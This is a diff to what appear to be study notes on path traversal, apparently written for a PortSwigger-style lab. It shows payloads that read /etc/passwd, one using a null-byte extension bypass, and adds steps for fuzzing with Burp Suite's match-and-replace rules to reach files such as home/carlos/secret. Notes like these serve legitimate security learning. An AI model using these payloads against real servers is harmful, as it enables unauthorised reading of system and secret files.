@@ -13,3 +13,12 @@
 /var/www/../../../etc/passwd
 ../../../../../etc/passwd%00.jpg # bypass extension  via byte null
 
+In burpsuite professional you can add a list to fuzzing path traversal.
+
+After that: payload processing -> add rule -> match & replace -> \{file\} for <file-you-want>
+
+Example:
+POC       -> \{file\} for etc/passwd 
+SECRET    -> \{file\} for home/carlos/secret
+
+![Screenshot1](../../04-Screenshots/path-traversal.png)
